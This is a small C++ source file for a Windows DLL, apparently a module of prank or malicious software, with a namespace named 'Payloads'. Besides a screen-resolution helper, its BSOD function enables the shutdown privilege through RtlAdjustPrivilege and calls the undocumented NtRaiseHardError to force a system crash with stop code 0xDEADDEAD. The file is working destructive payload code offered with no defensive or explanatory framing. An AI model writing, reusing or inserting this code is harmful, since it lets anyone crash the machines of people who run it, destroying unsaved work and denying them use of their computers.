// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

#pragma comment(lib, "ntdll.lib")
typedef long NTSTATUS;
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(DWORD, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

namespace Payloads {

	void GetDesktopResolution(int& w, int& h) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); w = desktop.right; h = desktop.bottom; }

	void Payloads::BSOD()
	{
		BOOLEAN prev; unsigned long response; DWORD error = 0xDEADDEAD;

		RtlAdjustPrivilege(19, 1, 0, &prev);
		NtRaiseHardError(error, 0, 0, 0, 6, &response);
	}
}